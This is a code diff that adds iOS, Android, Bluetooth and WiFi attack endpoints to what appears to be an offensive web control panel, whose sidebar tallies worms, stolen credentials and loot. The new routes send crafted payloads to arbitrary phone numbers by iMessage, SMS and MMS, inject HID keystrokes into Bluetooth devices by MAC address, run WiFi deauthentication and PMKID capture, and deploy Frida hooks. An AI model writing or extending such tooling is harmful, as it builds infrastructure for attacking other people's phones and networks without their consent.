@@ -129,6 +129,31 @@ try:
 except ImportError:
     _BB_OK = False
 
+try:
+    sys.path.insert(0, _MOD_DIR)
+    import ios_crash_research as _ios_mod
+    _IOS_OK = True
+except ImportError:
+    _IOS_OK = False
+
+try:
+    import android_surface as _android_mod
+    _ANDROID_OK = True
+except ImportError:
+    _ANDROID_OK = False
+
+try:
+    import bluetooth_probe as _bt_mod
+    _BT_OK = True
+except ImportError:
+    _BT_OK = False
+
+try:
+    import wifi_probe as _wifi_mod
+    _WIFI_OK = True
+except ImportError:
+    _WIFI_OK = False
+
 # ── Per-request polymorphic mutation cache ────────────────────────────────────
 _POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
 _POLY_LOCK  = threading.Lock()
@@ -807,6 +832,10 @@ a{{color:var(--acc);text-decoration:none}}
 <a class="nav" href="/adchain/help" target="_blank">&#x1F517; AD Chain</a>
 <a class="nav" href="/uefi/help" target="_blank">&#x1F4BE; UEFI</a>
 <a class="nav" href="/baseband/help" target="_blank">&#x1F4F6; Baseband</a>
+<a class="nav" href="/ios/help" target="_blank">&#x1F34E; iOS</a>
+<a class="nav" href="/android/help" target="_blank">&#x1F916; Android</a>
+<a class="nav" href="/bluetooth/help" target="_blank">&#x1F4F2; Bluetooth</a>
+<a class="nav" href="/wifi/help" target="_blank">&#x1F4F6; WiFi</a>
 <div id="sbar"><div>Online: <b>{ac}</b></div><div>Worms: <b>{wc}</b></div><div>Creds: <b>{cc}</b></div><div>Loot: <b>{lc}</b></div></div>
 </div>
 <div id="main">
@@ -1973,6 +2002,270 @@ class H(BaseHTTPRequestHandler):
                     self._send(json.dumps({"error": str(e)}), "application/json")
             else:
                 self._send("baseband_research module not available", "text/plain")
+            return
+
+        # ── iOS crash research ────────────────────────────────────────────────
+        if path.startswith("/ios"):
+            sub = path[4:].lstrip("/") or "help"
+            if _IOS_OK:
+                try:
+                    qs = dict(p.split("=", 1) for p in (parsed.query or "").split("&") if "=" in p)
+                    if sub == "help":
+                        self._send(
+                            "iOS Crash Research Endpoints:\n"
+                            "  /ios/corpus[?out=/tmp/dir]          Generate fuzzing payload corpus\n"
+                            "  /ios/send?target=NUM&payload=PATH   Send payload via iMessage/SMS\n"
+                            "  /ios/crashes[?udid=UDID]            Harvest crash logs from device\n"
+                            "  /ios/monitor[?duration=120&udid=X]  Continuous crash monitor\n"
+                            "  /ios/mms?target=NUM&payload=PATH    Send MMS payload\n",
+                            "text/plain")
+                    elif sub == "corpus":
+                        out_dir = qs.get("out", "/tmp/wizza_ios_corpus")
+                        corpus = _ios_mod.gen_fuzzing_corpus(out_dir)
+                        self._json({"payloads": len(corpus["payloads"]), "out_dir": corpus["out_dir"],
+                                    "types": list(set(p["type"] for p in corpus["payloads"]))})
+                    elif sub == "send":
+                        target = qs.get("target", "")
+                        payload = qs.get("payload", "")
+                        if not target or not payload:
+                            self._json({"error": "target and payload required"})
+                        else:
+                            r = _ios_mod.send_imessage_payload(target, payload)
+                            self._json(r)
+                    elif sub == "crashes":
+                        udid = qs.get("udid")
+                        r = _ios_mod.harvest_ios_crashes(udid)
+                        self._json({"total": r["total"], "processes": r["processes"],
+                                    "interesting": r.get("interesting", [])[:10]})
+                    elif sub == "monitor":
+                        duration = int(qs.get("duration", 60))
+                        udid = qs.get("udid")
+                        def _ios_mon():
+                            return _ios_mod.monitor_via_backup(duration=duration, udid=udid)
+                        import threading
+                        t = threading.Thread(target=_ios_mon, daemon=True)
+                        t.start()
+                        self._json({"status": "monitoring started", "duration": duration})
+                    elif sub == "mms":
+                        target = qs.get("target", "")
+                        payload = qs.get("payload", "")
+                        r = _ios_mod.send_mms_payload(target, payload)
+                        self._json(r)
+                    else:
+                        self._json({"error": f"Unknown iOS action: {sub}"})
+                except Exception as e:
+                    self._json({"error": str(e)})
+            else:
+                self._send("ios_crash_research module not available", "text/plain")
+            return
+
+        # ── Android surface research ──────────────────────────────────────────
+        if path.startswith("/android"):
+            sub = path[8:].lstrip("/") or "help"
+            if _ANDROID_OK:
+                try:
+                    qs = dict(p.split("=", 1) for p in (parsed.query or "").split("&") if "=" in p)
+                    serial = qs.get("serial")
+                    if sub == "help":
+                        self._send(
+                            "Android Surface Research Endpoints:\n"
+                            "  /android/device[?serial=X]              Device info\n"
+                            "  /android/frida[?target=sms|bt|media|all] Generate Frida hooks\n"
+                            "  /android/deploy_frida[?serial=X]        Deploy Frida server\n"
+                            "  /android/sms?target=NUM[&serial=X]      SMS fuzzing\n"
+                            "  /android/mms[?serial=X]                 MMS PDU fuzzing\n"
+                            "  /android/crashes[?duration=60&serial=X] Crash monitor\n"
+                            "  /android/intents?pkg=com.x[&serial=X]   Intent fuzzing\n",
+                            "text/plain")
+                    elif sub == "device":
+                        self._json(_android_mod.check_device(serial))
+                    elif sub == "frida":
+                        target = qs.get("target", "all")
+                        hooks = _android_mod.frida_hooks(target)
+                        out_dir = "/tmp/wizza_frida"
+                        os.makedirs(out_dir, exist_ok=True)
+                        saved = []
+                        for name, script in hooks.items():
+                            p = f"{out_dir}/{name}.js"
+                            open(p, "w").write(script)
+                            saved.append(p)
+                        self._json({"scripts": saved, "chars": {k: len(v) for k,v in hooks.items()}})
+                    elif sub == "deploy_frida":
+                        r = _android_mod.deploy_frida_server(serial=serial)
+                        self._json(r)
+                    elif sub == "sms":
+                        target = qs.get("target", "")
+                        count = int(qs.get("count", 20))
+                        r = _android_mod.fuzz_sms(target, count, serial)
+                        self._json({"sent": r["sent"], "payloads": len(r["payloads"])})
+                    elif sub == "mms":
+                        r = _android_mod.fuzz_mms(serial=serial)
+                        self._json(r)
+                    elif sub == "crashes":
+                        duration = int(qs.get("duration", 60))
+                        import threading
+                        results_holder = {}
+                        def _mon():
+                            results_holder["r"] = _android_mod.monitor_crashes(duration, serial)
+                        t = threading.Thread(target=_mon, daemon=True)
+                        t.start()
+                        self._json({"status": "monitoring", "duration": duration})
+                    elif sub == "intents":
+                        pkg = qs.get("pkg", "com.android.mms")
+                        r = _android_mod.fuzz_intents(pkg, serial)
+                        self._json({"sent": r["sent"], "crashes": r["crashes"][:5]})
+                    else:
+                        self._json({"error": f"Unknown android action: {sub}"})
+                except Exception as e:
+                    self._json({"error": str(e)})
+            else:
+                self._send("android_surface module not available", "text/plain")
+            return
+
+        # ── Bluetooth probe ───────────────────────────────────────────────────
+        if path.startswith("/bluetooth"):
+            sub = path[10:].lstrip("/") or "help"
+            if _BT_OK:
+                try:
+                    qs = dict(p.split("=", 1) for p in (parsed.query or "").split("&") if "=" in p)
+                    if sub == "help":
+                        self._send(
+                            "Bluetooth Probe Endpoints:\n"
+                            "  /bluetooth/scan[?duration=10]           Scan nearby BT/BLE devices\n"
+                            "  /bluetooth/ble_scan[?duration=10]       BLE-only scan\n"
+                            "  /bluetooth/l2cap?target=MAC[&count=50]  L2CAP fuzzing\n"
+                            "  /bluetooth/ble_adv[?count=100]          BLE advertisement fuzzing\n"
+                            "  /bluetooth/hid?target=MAC               HID injection\n"
+                            "  /bluetooth/gatt?target=MAC              GATT characteristic fuzzing\n"
+                            "  /bluetooth/hci[?count=30]               HCI raw command fuzzing\n"
+                            "  /bluetooth/full[?target=MAC]            Full BT probe\n",
+                            "text/plain")
+                    elif sub == "scan":
+                        duration = int(qs.get("duration", 8))
+                        devices = _bt_mod.bt_scan(duration)
+                        self._json({"devices": devices, "count": len(devices)})
+                    elif sub == "ble_scan":
+                        duration = int(qs.get("duration", 8))
+                        devices = _bt_mod.ble_scan(duration)
+                        self._json({"devices": devices, "count": len(devices)})
+                    elif sub == "l2cap":
+                        target = qs.get("target", "")
+                        count = int(qs.get("count", 30))
+                        if not target:
+                            self._json({"error": "target MAC required"})
+                        else:
+                            r = _bt_mod.l2cap_fuzz(target, count=count)
+                            self._json(r)
+                    elif sub == "ble_adv":
+                        count = int(qs.get("count", 50))
+                        hci = qs.get("hci", "hci0")
+                        r = _bt_mod.ble_adv_fuzz(count, hci)
+                        self._json({"sent": r["sent"], "errors": r["errors"][:3]})
+                    elif sub == "hid":
+                        target = qs.get("target", "")
+                        if not target:
+                            self._json({"error": "target MAC required"})
+                        else:
+                            r = _bt_mod.hid_inject(target)
+                            self._json(r)
+                    elif sub == "gatt":
+                        target = qs.get("target", "")
+                        if not target:
+                            self._json({"error": "target MAC required"})
+                        else:
+                            r = _bt_mod.gatt_fuzz(target)
+                            self._json(r)
+                    elif sub == "hci":
+                        count = int(qs.get("count", 30))
+                        hci = qs.get("hci", "hci0")
+                        r = _bt_mod.hci_raw_fuzz(hci, count)
+                        self._json({"sent": r["sent"], "interesting": r["interesting"],
+                                    "errors": r["errors"][:3]})
+                    elif sub == "full":
+                        target = qs.get("target")
+                        r = _bt_mod.full_bt_probe(target, scan=True)
+                        self._json({"target": r["target"], "scan_count": len(r["scan_results"]),
+                                    "ble_sent": r["ble_adv"].get("sent",0),
+                                    "l2cap_sent": r["l2cap"].get("sent",0),
+                                    "findings": r["findings"]})
+                    else:
+                        self._json({"error": f"Unknown bluetooth action: {sub}"})
+                except Exception as e:
+                    self._json({"error": str(e)})
+            else:
+                self._send("bluetooth_probe module not available", "text/plain")
+            return
+
+        # ── WiFi probe ────────────────────────────────────────────────────────
+        if path.startswith("/wifi"):
+            sub = path[5:].lstrip("/") or "help"
+            if _WIFI_OK:
+                try:
+                    qs = dict(p.split("=", 1) for p in (parsed.query or "").split("&") if "=" in p)
+                    if sub == "help":
+                        self._send(
+                            "WiFi Probe Endpoints:\n"
+                            "  /wifi/interfaces                         List wireless interfaces\n"
+                            "  /wifi/monitor?iface=wlan0               Enable monitor mode\n"
+                            "  /wifi/beacon?iface=wlan0[&bssid=X]      Beacon frame fuzzing\n"
+                            "  /wifi/deauth?iface=X&bssid=X[&client=X] Deauth test (PMF check)\n"
+                            "  /wifi/pmkid?iface=X[&bssid=X&timeout=30] PMKID capture\n"
+                            "  /wifi/full?iface=X[&bssid=X]            Full WiFi probe\n",
+                            "text/plain")
+                    elif sub == "interfaces":
+                        ifaces = _wifi_mod.get_wireless_interfaces()
+                        self._json({"interfaces": ifaces})
+                    elif sub == "monitor":
+                        iface = qs.get("iface", "wlan0")
+                        r = _wifi_mod.enable_monitor_mode(iface)
+                        self._json(r)
+                    elif sub == "beacon":
+                        iface = qs.get("iface", "wlan0")
+                        bssid = qs.get("bssid")
+                        count = int(qs.get("count", 50))
+                        channel = int(qs.get("channel", 6))
+                        r = _wifi_mod.beacon_fuzz(iface, bssid, count, channel)
+                        self._json({"sent": r["sent"], "variants": r["variants"],
+                                    "errors": r["errors"][:3]})
+                    elif sub == "deauth":
+                        iface = qs.get("iface", "wlan0")
+                        bssid = qs.get("bssid", "")
+                        client = qs.get("client", "broadcast")
+                        count = int(qs.get("count", 5))
+                        if not bssid:
+                            self._json({"error": "bssid required"})
+                        else:
+                            r = _wifi_mod.deauth_test(iface, bssid, client, count)
+                            self._json(r)
+                    elif sub == "pmkid":
+                        iface = qs.get("iface", "wlan0")
+                        bssid = qs.get("bssid")
+                        timeout = int(qs.get("timeout", 30))
+                        import threading
+                        results_holder = {}
+                        def _pmkid():
+                            results_holder["r"] = _wifi_mod.pmkid_capture(iface, bssid, timeout)
+                        t = threading.Thread(target=_pmkid, daemon=True)
+                        t.start()
+                        self._json({"status": "capturing", "timeout": timeout,
+                                    "note": "Check /wifi/pmkid again after timeout"})
+                    elif sub == "full":
+                        iface = qs.get("iface", "wlan0")
+                        bssid = qs.get("bssid")
+                        import threading
+                        results_holder = {}
+                        def _wfull():
+                            results_holder["r"] = _wifi_mod.full_wifi_probe(iface, bssid)
+                        t = threading.Thread(target=_wfull, daemon=True)
+                        t.start()
+                        self._json({"status": "probe started", "iface": iface,
+                                    "note": "Full probe running in background"})
+                    else:
+                        self._json({"error": f"Unknown wifi action: {sub}"})
+                except Exception as e:
+                    self._json({"error": str(e)})
+            else:
+                self._send("wifi_probe module not available", "text/plain")
             return
 
         # ── Exploit module index ──────────────────────────────────────────────
